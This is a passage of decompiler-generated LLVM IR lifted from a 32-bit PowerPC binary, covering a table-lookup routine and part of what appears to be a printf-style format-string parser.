  %v1_1000607c = call i32 @__asm_rlwinm(i32 %v1_10006078, i32 0, i32 0, i32 30)
  store i32 %v1_1000607c, i32* %r0.global-to-local, align 4
  %v1_10006080 = load i32, i32* @r3, align 4
  %v2_10006080 = add i32 %v1_10006080, 16
  %v3_10006080 = inttoptr i32 %v2_10006080 to i32*
  store i32 %v1_1000607c, i32* %v3_10006080, align 4
  %v0_10006084 = load i32, i32* @r3, align 4
  ret i32 %v0_10006084

; uselistorder directives
  uselistorder i32 %v3_10006038, { 1, 0, 2 }
  uselistorder i32 %v1_1000603c, { 1, 0 }
  uselistorder i32 %v3_10006008, { 1, 0, 2 }
  uselistorder i32 %v1_10006004, { 2, 3, 1, 0 }
  uselistorder i32 %v0_10006008, { 0, 2, 1 }
  uselistorder i32 %v4_10005fc8, { 1, 0, 2 }
  uselistorder i32 %v4_10005f80, { 1, 0, 2 }
  uselistorder i32 %v0_10005f68, { 1, 0 }
  uselistorder i32 %v1_10005f3c, { 1, 0 }
  uselistorder i32 %v0_10005f54, { 1, 0 }
  uselistorder i8 %v3_10005f20, { 1, 0, 2 }
  uselistorder i32 %v1_10005ee4, { 0, 2, 1, 3 }
  uselistorder i32 %v3_10005ed8, { 4, 1, 0, 3, 2, 8, 5, 7, 6, 10, 9, 11 }
  uselistorder i32 %v0_10005ed0, { 1, 0 }
  uselistorder i32 %v2_10005fe0, { 5, 3, 4, 1, 2, 6, 7, 0 }
  uselistorder i32 %v0_100060085, { 1, 0, 2 }
  uselistorder i32 %v4_10005e88, { 1, 0, 2 }
  uselistorder i32 %v3_10005e78, { 1, 0, 2 }
  uselistorder i32 %v2_10005ea4, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v4_10005e38, { 1, 0, 2 }
  uselistorder i32 %v3_10005e20, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v3_10005e18, { 1, 0, 2 }
  uselistorder i32 %v0_10005e18, { 4, 5, 2, 0, 1, 3, 6, 7, 8 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32* %r7.global-to-local, { 2, 1, 0 }
  uselistorder i32* %r10.global-to-local, { 2, 3, 0, 1, 4, 5, 6, 7, 8 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 20, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 0, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder i1* %cr7_gt.global-to-local, { 2, 3, 4, 13, 5, 6, 7, 8, 0, 19, 9, 10, 11, 12, 1, 14, 15, 16, 17, 18 }
  uselistorder label %dec_label_pc_10006058, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_10006038, { 1, 0 }
  uselistorder label %dec_label_pc_10006004, { 1, 0 }
  uselistorder label %dec_label_pc_10006000, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10005ff8, { 1, 0 }
  uselistorder label %dec_label_pc_10005fc8, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10005f7c, { 1, 0 }
  uselistorder label %dec_label_pc_10005f68, { 1, 0 }
  uselistorder label %dec_label_pc_10005ed0, { 1, 0 }
  uselistorder label %dec_label_pc_10006008.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10005ebc, { 1, 0 }
  uselistorder label %dec_label_pc_10005e78, { 1, 0 }
  uselistorder label %dec_label_pc_10005e6c, { 1, 0 }
}

define i32 @function_10006088(i32 %arg1) local_unnamed_addr {
dec_label_pc_10006088:
  br label %dec_label_pc_10006094

dec_label_pc_10006094:                            ; preds = %dec_label_pc_10006094, %dec_label_pc_10006088
  %v0_10006094 = phi i32 [ ptrtoint (i32* @global_var_1000e0f8.229 to i32), %dec_label_pc_10006088 ], [ %v1_10006094, %dec_label_pc_10006094 ]
  %v1_10006094 = add i32 %v0_10006094, -2
  %v2_10006094 = inttoptr i32 %v1_10006094 to i16*
  %v3_10006094 = load i16, i16* %v2_10006094, align 2
  %v4_10006094 = sext i16 %v3_10006094 to i32
  %v4_10006098 = icmp eq i32 %v4_10006094, %arg1
  %v3_1000609c.not = icmp ule i32 %v1_10006094, ptrtoint (i32* @global_var_1000e0e0.230 to i32)
  %brmerge = or i1 %v4_10006098, %v3_1000609c.not
  br i1 %brmerge, label %dec_label_pc_100060a8, label %dec_label_pc_10006094

dec_label_pc_100060a8:                            ; preds = %dec_label_pc_10006094
  %v2_100060b0 = sub i32 %v1_10006094, ptrtoint (i32* @global_var_1000e0e0.230 to i32)
  %v1_100060b8 = udiv i32 %v2_100060b0, 2
  %v2_100060b8 = and i32 %v2_100060b0, -2147483648
  %v3_100060b8 = or i32 %v1_100060b8, %v2_100060b8
  %v2_100060c0 = add i32 %v3_100060b8, ptrtoint (i32* @global_var_1000e0f8.229 to i32)
  %v3_100060c0 = inttoptr i32 %v2_100060c0 to i8*
  %v4_100060c0 = load i8, i8* %v3_100060c0, align 1
  %v5_100060c0 = zext i8 %v4_100060c0 to i32
  ret i32 %v5_100060c0

; uselistorder directives
  uselistorder i32 %v2_100060b0, { 1, 0 }
  uselistorder i32 %v1_10006094, { 1, 0, 3, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_1000e0e0.230 to i32), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1000e0f8.229 to i32), { 1, 0 }
}

define i32 @function_100060c8(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_100060c8:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %tmp46 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-79 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %v0_100060cc = load i32, i32* @lr, align 4
  store i32 %v0_100060cc, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  store i32 8, i32* %r11.global-to-local, align 4
  store i32 %tmp, i32* @r28, align 4
  %v1_100060e4 = add i32 %tmp, 16
  %v2_100060e4 = inttoptr i32 %v1_100060e4 to i32*
  %v3_100060e4 = load i32, i32* %v2_100060e4, align 4
  store i32 %v3_100060e4, i32* %r0.global-to-local, align 4
  %v1_100060f4 = and i32 %v3_100060e4, 128
  store i32 %v1_100060f4, i32* %r5.global-to-local, align 4
  %v3_100060f4 = icmp eq i32 %v1_100060f4, 0
  store i32 8, i32* %stack_var_-104, align 4
  %v1_100060fc = add i32 %tmp, 24
  %v2_100060fc = inttoptr i32 %v1_100060fc to i32*
  %v3_100060fc = load i32, i32* %v2_100060fc, align 4
  store i32 %v3_100060fc, i32* @r26, align 4
  br i1 %v3_100060f4, label %dec_label_pc_10006104, label %dec_label_pc_1000611c

dec_label_pc_10006104:                            ; preds = %dec_label_pc_100060c8
  %v2_10006104 = load i32, i32* %arg1, align 4
  %.pre = ptrtoint i32* %stack_var_-104 to i32
  br label %dec_label_pc_10006170

dec_label_pc_10006114:                            ; preds = %dec_label_pc_10006344
  %v1_10006114 = add i32 %v0_10006314, 1
  store i32 %v1_10006114, i32* @r30, align 4
  br label %dec_label_pc_1000635c

dec_label_pc_1000611c:                            ; preds = %dec_label_pc_100060c8
  store i32 32, i32* %r0.global-to-local, align 4
  %v2_10006120 = load i32, i32* %arg1, align 4
  store i32 %v2_10006120, i32* %r7.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  %v2_1000612c = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_1000612c, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10006130

dec_label_pc_10006130:                            ; preds = %dec_label_pc_10006160.dec_label_pc_10006130_crit_edge, %dec_label_pc_1000611c
  %v0_10006138 = phi i32 [ %v0_10006138.pre, %dec_label_pc_10006160.dec_label_pc_10006130_crit_edge ], [ %v2_10006120, %dec_label_pc_1000611c ]
  %v0_10006134 = phi i32 [ %v0_10006134.pre, %dec_label_pc_10006160.dec_label_pc_10006130_crit_edge ], [ %v2_1000612c, %dec_label_pc_1000611c ]
  %v0_1000613c = phi i32 [ %v0_10006130.pre, %dec_label_pc_10006160.dec_label_pc_10006130_crit_edge ], [ 0, %dec_label_pc_1000611c ]
  %v1_10006130 = mul i32 %v0_1000613c, 4
  %v2_10006134 = add i32 %v0_1000613c, %v0_10006134
  store i32 %v2_10006134, i32* %r10.global-to-local, align 4
  %v2_10006138 = add i32 %v1_10006130, %v0_10006138
  store i32 %v2_10006138, i32* %r11.global-to-local, align 4
  %v1_1000613c = add i32 %v0_1000613c, 1
  store i32 %v1_1000613c, i32* %r8.global-to-local, align 4
  %v1_10006140 = add i32 %v2_10006138, -4
  %v2_10006140 = inttoptr i32 %v1_10006140 to i32*
  %v3_10006140 = load i32, i32* %v2_10006140, align 4
  store i32 %v3_10006140, i32* %r9.global-to-local, align 4
  %v1_10006144 = trunc i32 %v3_10006140 to i8
  %v3_10006144 = add i32 %v2_10006134, 24
  %v4_10006144 = inttoptr i32 %v3_10006144 to i8*
  store i8 %v1_10006144, i8* %v4_10006144, align 1
  %v0_10006148 = load i32, i32* %r9.global-to-local, align 4
  %v1_10006148 = urem i32 %v0_10006148, 256
  store i32 %v1_10006148, i32* %r9.global-to-local, align 4
  %v0_10006150 = load i32, i32* %r11.global-to-local, align 4
  %v1_10006150 = add i32 %v0_10006150, -4
  %v2_10006150 = inttoptr i32 %v1_10006150 to i32*
  %v3_10006150 = load i32, i32* %v2_10006150, align 4
  store i32 %v3_10006150, i32* %r0.global-to-local, align 4
  %v4_10006154 = icmp eq i32 %v1_10006148, %v3_10006150
  br i1 %v4_10006154, label %dec_label_pc_1000615c, label %dec_label_pc_100065cc

dec_label_pc_1000615c:                            ; preds = %dec_label_pc_10006130
  %v3_1000614c = icmp eq i32 %v1_10006148, 0
  br i1 %v3_1000614c, label %dec_label_pc_10006164, label %dec_label_pc_10006160

dec_label_pc_10006160:                            ; preds = %dec_label_pc_1000615c
  %v0_10006160 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10006160 = add i32 %v0_10006160, -1
  store i32 %v1_10006160, i32* %ctr.global-to-local, align 4
  %v2_10006160 = icmp eq i32 %v1_10006160, 0
  br i1 %v2_10006160, label %dec_label_pc_10006164, label %dec_label_pc_10006160.dec_label_pc_10006130_crit_edge

dec_label_pc_10006160.dec_label_pc_10006130_crit_edge: ; preds = %dec_label_pc_10006160
  %v0_10006130.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_10006134.pre = load i32, i32* %r6.global-to-local, align 4
  %v0_10006138.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10006130

dec_label_pc_10006164:                            ; preds = %dec_label_pc_10006160, %dec_label_pc_1000615c
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10006168 = ptrtoint i32* %stack_var_-79 to i32
  br label %dec_label_pc_10006170

dec_label_pc_10006170:                            ; preds = %dec_label_pc_10006104, %dec_label_pc_10006164
  %v2_10006180.pre-phi = phi i32 [ %.pre, %dec_label_pc_10006104 ], [ %v2_1000612c, %dec_label_pc_10006164 ]
  %storemerge3 = phi i32 [ %v2_10006104, %dec_label_pc_10006104 ], [ %v2_10006168, %dec_label_pc_10006164 ]
  store i32 %storemerge3, i32* %r10.global-to-local, align 4
  store i32 0, i32* @r31, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r27, align 4
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* @r25, align 4
  store i32 %v2_10006180.pre-phi, i32* @r29, align 4
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10006190

dec_label_pc_1000618c:                            ; preds = %dec_label_pc_1000629c, %dec_label_pc_10006320
  %v0_1000618c = phi i32 [ %v1_10006320, %dec_label_pc_10006320 ], [ %v0_10006284, %dec_label_pc_1000629c ]
  %stack_var_-84.0 = phi i32 [ %stack_var_-84.3, %dec_label_pc_10006320 ], [ %stack_var_-84.2, %dec_label_pc_1000629c ]
  store i32 %v0_1000618c, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10006190

dec_label_pc_10006190:                            ; preds = %dec_label_pc_10006170, %dec_label_pc_1000618c
  %v0_100061a4 = phi i32 [ %storemerge3, %dec_label_pc_10006170 ], [ %v0_1000618c, %dec_label_pc_1000618c ]
  %stack_var_-84.1 = phi i32 [ %tmp46, %dec_label_pc_10006170 ], [ %stack_var_-84.0, %dec_label_pc_1000618c ]
  %v1_10006190 = inttoptr i32 %v0_100061a4 to i8*
  %v2_10006190 = load i8, i8* %v1_10006190, align 1
  %v3_10006190 = zext i8 %v2_10006190 to i32
  store i32 %v3_10006190, i32* %r0.global-to-local, align 4
  store i32 %v0_100061a4, i32* @r30, align 4
  %v3_10006198 = icmp eq i8 %v2_10006190, 42
  br i1 %v3_10006198, label %dec_label_pc_100061a0, label %dec_label_pc_100061b0

dec_label_pc_100061a0:                            ; preds = %dec_label_pc_10006190
  %v0_100061a0 = load i32, i32* %r4.global-to-local, align 4
  %v1_100061a0 = mul i32 %v0_100061a0, -4
  store i32 %v1_100061a0, i32* %r0.global-to-local, align 4
  %v1_100061a4 = add i32 %v0_100061a4, 1
  store i32 %v1_100061a4, i32* @r30, align 4
  %v0_100061a8 = load i32, i32* @r1, align 4
  %v2_100061a8 = add i32 %v0_100061a8, %v1_100061a0
  store i32 %v2_100061a8, i32* %r9.global-to-local, align 4
  %v0_100061ac = load i32, i32* @r27, align 4
  %v2_100061ac = add i32 %v2_100061a8, 8
  %v3_100061ac = inttoptr i32 %v2_100061ac to i32*
  store i32 %v0_100061ac, i32* %v3_100061ac, align 4
  %v0_100061c8.pre.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_100061b0

dec_label_pc_100061b0:                            ; preds = %dec_label_pc_10006190, %dec_label_pc_100061a0
  %v0_100061c8.pre = phi i32 [ %v0_100061a4, %dec_label_pc_10006190 ], [ %v0_100061c8.pre.pre, %dec_label_pc_100061a0 ]
  %v0_100061b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_100061b0 = add i32 %v0_100061b0, 1100
  %v2_100061b0 = inttoptr i32 %v1_100061b0 to i32*
  %v3_100061b0 = load i32, i32* %v2_100061b0, align 4
  store i32 %v3_100061b0, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_100061c8

dec_label_pc_100061bc:                            ; preds = %dec_label_pc_100061c8
  %v2_100061d0 = icmp sgt i32 %v0_10006214, 4094
  br i1 %v2_100061d0, label %dec_label_pc_100061c4, label %dec_label_pc_100061c0

dec_label_pc_100061c0:                            ; preds = %dec_label_pc_100061bc
  %v1_100061c0 = add i32 %v2_100061d8, -48
  store i32 %v1_100061c0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_100061c4

dec_label_pc_100061c4:                            ; preds = %dec_label_pc_100061bc, %dec_label_pc_100061c0
  %v0_100061cc15 = phi i32 [ %v0_10006214, %dec_label_pc_100061bc ], [ %v1_100061c0, %dec_label_pc_100061c0 ]
  %v1_100061c4 = add i32 %v0_10006244, 1
  store i32 %v1_100061c4, i32* @r30, align 4
  br label %dec_label_pc_100061c8

dec_label_pc_100061c8:                            ; preds = %dec_label_pc_100061b0, %dec_label_pc_100061c4
  %v0_10006214 = phi i32 [ 0, %dec_label_pc_100061b0 ], [ %v0_100061cc15, %dec_label_pc_100061c4 ]
  %v0_10006244 = phi i32 [ %v0_100061c8.pre, %dec_label_pc_100061b0 ], [ %v1_100061c4, %dec_label_pc_100061c4 ]
  %v1_100061c8 = inttoptr i32 %v0_10006244 to i8*
  %v2_100061c8 = load i8, i8* %v1_100061c8, align 1
  %v3_100061c8 = zext i8 %v2_100061c8 to i32
  store i32 %v3_100061c8, i32* %r8.global-to-local, align 4
  %v1_100061cc = mul i32 %v0_10006214, 10
  %v1_100061d4 = mul nuw nsw i32 %v3_100061c8, 2
  store i32 %v1_100061d4, i32* %r9.global-to-local, align 4
  %v2_100061d8 = add i32 %v3_100061c8, %v1_100061cc
  store i32 %v2_100061d8, i32* %r11.global-to-local, align 4
  %v2_100061dc = add i32 %v1_100061d4, %v3_100061b0
  %v3_100061dc = inttoptr i32 %v2_100061dc to i16*
  %v4_100061dc = load i16, i16* %v3_100061dc, align 2
  %v5_100061dc = zext i16 %v4_100061dc to i32
  store i32 %v5_100061dc, i32* %r0.global-to-local, align 4
  %v1_100061e0 = and i32 %v5_100061dc, 8
  store i32 %v1_100061e0, i32* %r9.global-to-local, align 4
  %v3_100061e0 = icmp eq i32 %v1_100061e0, 0
  br i1 %v3_100061e0, label %dec_label_pc_100061e8, label %dec_label_pc_100061bc

dec_label_pc_100061e8:                            ; preds = %dec_label_pc_100061c8
  %v0_100061e8 = load i32, i32* %r10.global-to-local, align 4
  %v1_100061e8 = add i32 %v0_100061e8, -1
  %v2_100061e8 = inttoptr i32 %v1_100061e8 to i8*
  %v3_100061e8 = load i8, i8* %v2_100061e8, align 1
  %v4_100061e8 = zext i8 %v3_100061e8 to i32
  store i32 %v4_100061e8, i32* %r0.global-to-local, align 4
  %v3_100061ec = icmp eq i8 %v3_100061e8, 37
  br i1 %v3_100061ec, label %dec_label_pc_100061f4, label %dec_label_pc_100062bc

dec_label_pc_100061f4:                            ; preds = %dec_label_pc_100061e8
  %v3_100061f4 = icmp eq i8 %v2_100061c8, 36
  br i1 %v3_100061f4, label %dec_label_pc_100061fc, label %dec_label_pc_10006230

dec_label_pc_100061fc:                            ; preds = %dec_label_pc_100061f4
  %tmp58 = icmp slt i32 %v0_10006214, 1
  br i1 %tmp58, label %dec_label_pc_10006230, label %dec_label_pc_10006204

dec_label_pc_10006204:                            ; preds = %dec_label_pc_100061fc
  %v0_10006204 = load i32, i32* @r26, align 4
  %v3_10006204 = icmp eq i32 %v0_10006204, 0
  %v1_10006208 = add i32 %v0_10006244, 1
  store i32 %v1_10006208, i32* %r10.global-to-local, align 4
  br i1 %v3_10006204, label %dec_label_pc_100065cc, label %dec_label_pc_10006210

dec_label_pc_10006210:                            ; preds = %dec_label_pc_10006204
  %v3_10006210 = icmp sgt i32 %v0_10006214, %v0_10006204
  br i1 %v3_10006210, label %dec_label_pc_1000621c, label %dec_label_pc_10006228

dec_label_pc_1000621c:                            ; preds = %dec_label_pc_10006210
  store i32 %v0_10006214, i32* @r26, align 4
  br label %dec_label_pc_10006228

dec_label_pc_10006224:                            ; preds = %dec_label_pc_1000624c, %dec_label_pc_10006244
  store i32 0, i32* @r26, align 4
  br label %dec_label_pc_10006228

dec_label_pc_10006228:                            ; preds = %dec_label_pc_10006210, %dec_label_pc_1000621c, %dec_label_pc_10006224
  %v0_10006228 = phi i32 [ %v0_100061e8, %dec_label_pc_10006224 ], [ %v1_10006208, %dec_label_pc_1000621c ], [ %v1_10006208, %dec_label_pc_10006210 ]
  %stack_var_-84.2 = phi i32 [ %stack_var_-84.1, %dec_label_pc_10006224 ], [ %v0_10006214, %dec_label_pc_1000621c ], [ %v0_10006214, %dec_label_pc_10006210 ]
  br label %dec_label_pc_10006264

dec_label_pc_10006230:                            ; preds = %dec_label_pc_100061f4, %dec_label_pc_100061fc
  %v0_10006230 = load i32, i32* @r26, align 4
  %tmp59 = icmp slt i32 %v0_10006230, 1
  br i1 %tmp59, label %dec_label_pc_10006244, label %dec_label_pc_10006238

dec_label_pc_10006238:                            ; preds = %dec_label_pc_10006230
  %v3_10006238 = icmp eq i8 %v2_100061c8, 109
  br i1 %v3_10006238, label %dec_label_pc_100062bc, label %dec_label_pc_100065cc

dec_label_pc_10006244:                            ; preds = %dec_label_pc_10006230
  %v3_10006244 = icmp ugt i32 %v0_10006244, %v0_100061e8
  br i1 %v3_10006244, label %dec_label_pc_1000624c, label %dec_label_pc_10006224

dec_label_pc_1000624c:                            ; preds = %dec_label_pc_10006244
  %v1_1000624c = inttoptr i32 %v0_100061e8 to i8*
  %v2_1000624c = load i8, i8* %v1_1000624c, align 1
  %v3_1000624c = zext i8 %v2_1000624c to i32
  store i32 %v3_1000624c, i32* %r0.global-to-local, align 4
  store i32 %v0_100061e8, i32* %r11.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  %v3_10006258 = icmp eq i8 %v2_1000624c, 48
  br i1 %v3_10006258, label %dec_label_pc_10006224, label %dec_label_pc_100062c0

dec_label_pc_10006264:                            ; preds = %dec_label_pc_10006280, %dec_label_pc_10006228
  %v0_10006284 = phi i32 [ %v0_10006228, %dec_label_pc_10006228 ], [ %v1_10006284, %dec_label_pc_10006280 ]
  store i32 %v0_10006284, i32* @r30, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1000e0d8.233 to i32), i32* %r11.global-to-local, align 4
  store i32 1, i32* %r10.global-to-local, align 4
  %v1_10006274 = inttoptr i32 %v0_10006284 to i8*
  br label %dec_label_pc_1000626c

dec_label_pc_1000626c:                            ; preds = %dec_label_pc_1000628c, %dec_label_pc_10006264
  %v1_10006280 = phi i32 [ %v1_10006290, %dec_label_pc_1000628c ], [ 1, %dec_label_pc_10006264 ]
  %v0_1000626c = phi i32 [ %v1_10006270, %dec_label_pc_1000628c ], [ ptrtoint ([8 x i8]* @global_var_1000e0d8.233 to i32), %dec_label_pc_10006264 ]
  %v1_1000626c = inttoptr i32 %v0_1000626c to i8*
  %v2_1000626c = load i8, i8* %v1_1000626c, align 1
  %v3_1000626c = zext i8 %v2_1000626c to i32
  store i32 %v3_1000626c, i32* %r9.global-to-local, align 4
  %v1_10006270 = add i32 %v0_1000626c, 1
  store i32 %v1_10006270, i32* %r11.global-to-local, align 4
  %v2_10006274 = load i8, i8* %v1_10006274, align 1
  %v3_10006274 = zext i8 %v2_10006274 to i32
  store i32 %v3_10006274, i32* %r0.global-to-local, align 4
  %v4_10006278 = icmp eq i8 %v2_10006274, %v2_1000626c
  br i1 %v4_10006278, label %dec_label_pc_10006280, label %dec_label_pc_1000628c

dec_label_pc_10006280:                            ; preds = %dec_label_pc_1000626c
  %v0_10006280 = load i32, i32* %r5.global-to-local, align 4
  %v2_10006280 = or i32 %v0_10006280, %v1_10006280
  store i32 %v2_10006280, i32* %r5.global-to-local, align 4
  %v1_10006284 = add i32 %v0_10006284, 1
  br label %dec_label_pc_10006264

dec_label_pc_1000628c:                            ; preds = %dec_label_pc_1000626c
  %v1_1000628c = inttoptr i32 %v1_10006270 to i8*
  %v2_1000628c = load i8, i8* %v1_1000628c, align 1
  %v3_1000628c = zext i8 %v2_1000628c to i32
  store i32 %v3_1000628c, i32* %r0.global-to-local, align 4
  %v1_10006290 = mul i32 %v1_10006280, 2
  store i32 %v1_10006290, i32* %r10.global-to-local, align 4
  %v3_10006294 = icmp eq i8 %v2_1000628c, 0
  br i1 %v3_10006294, label %dec_label_pc_1000629c, label %dec_label_pc_1000626c

dec_label_pc_1000629c:                            ; preds = %dec_label_pc_1000628c
  %v1_1000629c = add i32 %v0_10006284, -1
  %v2_1000629c = inttoptr i32 %v1_1000629c to i8*
  %v3_1000629c = load i8, i8* %v2_1000629c, align 1
  %v4_1000629c = zext i8 %v3_1000629c to i32
  store i32 %v4_1000629c, i32* %r0.global-to-local, align 4
  %v0_100062a0 = load i32, i32* %r5.global-to-local, align 4
  %v1_100062a0 = and i32 %v0_100062a0, 10
  store i32 0, i32* %r7.global-to-local, align 4
  %v1_100062a8 = udiv i32 %v1_100062a0, 2
  store i32 %v1_100062a8, i32* %r9.global-to-local, align 4
  %v3_100062ac = icmp eq i8 %v3_1000629c, 37
  %v2_100062b0 = sub nuw nsw i32 -1, %v1_100062a8
  %v3_100062b0 = and i32 %v0_100062a0, %v2_100062b0
  store i32 %v3_100062b0, i32* %r5.global-to-local, align 4
  br i1 %v3_100062ac, label %dec_label_pc_100062c0, label %dec_label_pc_1000618c

dec_label_pc_100062bc:                            ; preds = %dec_label_pc_100061e8, %dec_label_pc_10006238
  store i32 %v0_100061e8, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_100062c0

dec_label_pc_100062c0:                            ; preds = %dec_label_pc_1000624c, %dec_label_pc_1000629c, %dec_label_pc_100062bc
  %v0_100062f4 = phi i32 [ 0, %dec_label_pc_1000629c ], [ %v0_10006214, %dec_label_pc_1000624c ], [ %v0_10006214, %dec_label_pc_100062bc ]
  %v1_10006300 = phi i32 [ %v0_10006284, %dec_label_pc_1000629c ], [ %v0_10006244, %dec_label_pc_1000624c ], [ %v0_10006244, %dec_label_pc_100062bc ]
  %v0_100062fc = phi i32 [ %v1_10006270, %dec_label_pc_1000629c ], [ %v0_100061e8, %dec_label_pc_1000624c ], [ %v0_100061e8, %dec_label_pc_100062bc ]
  %stack_var_-84.3 = phi i32 [ %stack_var_-84.2, %dec_label_pc_1000629c ], [ %stack_var_-84.1, %dec_label_pc_1000624c ], [ %stack_var_-84.1, %dec_label_pc_100062bc ]
  %v1_100062c0 = inttoptr i32 %v0_100062fc to i8*
  %v2_100062c0 = load i8, i8* %v1_100062c0, align 1
  %v3_100062c0 = zext i8 %v2_100062c0 to i32
  store i32 %v3_100062c0, i32* %r0.global-to-local, align 4
  %v3_100062c4 = icmp eq i8 %v2_100062c0, 42
  br i1 %v3_100062c4, label %dec_label_pc_100062cc, label %dec_label_pc_1000630c

dec_label_pc_100062cc:                            ; preds = %dec_label_pc_100062c0
  %v0_100062cc = load i32, i32* @r26, align 4
  %v3_100062cc = icmp eq i32 %v0_100062cc, 0
  br i1 %v3_100062cc, label %dec_label_pc_100062fc, label %dec_label_pc_100062d4

dec_label_pc_100062d4:                            ; preds = %dec_label_pc_100062cc
  %v1_100062d4 = inttoptr i32 %v1_10006300 to i8*
  %v2_100062d4 = load i8, i8* %v1_100062d4, align 1
  %v3_100062d4 = zext i8 %v2_100062d4 to i32
  store i32 %v3_100062d4, i32* %r0.global-to-local, align 4
  %v3_100062d8 = icmp eq i8 %v2_100062d4, 36
  br i1 %v3_100062d8, label %dec_label_pc_100062e0, label %dec_label_pc_100065cc

dec_label_pc_100062e0:                            ; preds = %dec_label_pc_100062d4
  %tmp60 = icmp slt i32 %v0_100062f4, 1
  br i1 %tmp60, label %dec_label_pc_100065cc, label %dec_label_pc_100062e8

dec_label_pc_100062e8:                            ; preds = %dec_label_pc_100062e0
  %v0_100062e8 = load i32, i32* %r4.global-to-local, align 4
  %v1_100062e8 = mul i32 %v0_100062e8, -4
  %v1_100062ec = add i32 %v1_10006300, 1
  store i32 %v1_100062ec, i32* @r30, align 4
  %v0_100062f0 = load i32, i32* @r29, align 4
  %v2_100062f0 = add i32 %v0_100062f0, %v1_100062e8
  store i32 %v2_100062f0, i32* %r9.global-to-local, align 4
  %v2_100062f4 = add i32 %v2_100062f0, 12
  %v3_100062f4 = inttoptr i32 %v2_100062f4 to i32*
  store i32 %v0_100062f4, i32* %v3_100062f4, align 4
  %v0_10006314.pre.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10006308

dec_label_pc_100062fc:                            ; preds = %dec_label_pc_100062cc
  %v1_100062fc = add i32 %v0_100062fc, 1
  store i32 %v1_100062fc, i32* %r0.global-to-local, align 4
  %v4_10006300 = icmp eq i32 %v1_100062fc, %v1_10006300
  br i1 %v4_10006300, label %dec_label_pc_10006308, label %dec_label_pc_100065cc

dec_label_pc_10006308:                            ; preds = %dec_label_pc_100062fc, %dec_label_pc_100062e8
  %v0_10006314.pre = phi i32 [ %v1_10006300, %dec_label_pc_100062fc ], [ %v0_10006314.pre.pre, %dec_label_pc_100062e8 ]
  store i32 -2147483648, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1000630c

dec_label_pc_1000630c:                            ; preds = %dec_label_pc_100062c0, %dec_label_pc_10006308
  %v0_10006314 = phi i32 [ %v1_10006300, %dec_label_pc_100062c0 ], [ %v0_10006314.pre, %dec_label_pc_10006308 ]
  %v0_10006324 = phi i32 [ %v0_100062f4, %dec_label_pc_100062c0 ], [ -2147483648, %dec_label_pc_10006308 ]
  %v0_1000630c = load i32, i32* %r4.global-to-local, align 4
  %v3_1000630c = icmp eq i32 %v0_1000630c, 0
  %v1_10006314 = inttoptr i32 %v0_10006314 to i8*
  br i1 %v3_1000630c, label %dec_label_pc_10006314, label %dec_label_pc_10006338

dec_label_pc_10006314:                            ; preds = %dec_label_pc_1000630c
  %v2_10006314 = load i8, i8* %v1_10006314, align 1
  %v3_10006314 = zext i8 %v2_10006314 to i32
  store i32 %v3_10006314, i32* %r0.global-to-local, align 4
  %v3_10006318 = icmp eq i8 %v2_10006314, 46
  br i1 %v3_10006318, label %dec_label_pc_10006320, label %dec_label_pc_10006330

dec_label_pc_10006320:                            ; preds = %dec_label_pc_10006314
  %v1_10006320 = add i32 %v0_10006314, 1
  store i32 %v0_10006324, i32* @r31, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000618c

dec_label_pc_10006330:                            ; preds = %dec_label_pc_10006314
  store i32 %v0_10006324, i32* @r31, align 4
  br label %dec_label_pc_10006338

dec_label_pc_10006338:                            ; preds = %dec_label_pc_1000630c, %dec_label_pc_10006330
  %storemerge1 = phi i32 [ -1, %dec_label_pc_10006330 ], [ %v0_10006324, %dec_label_pc_1000630c ]
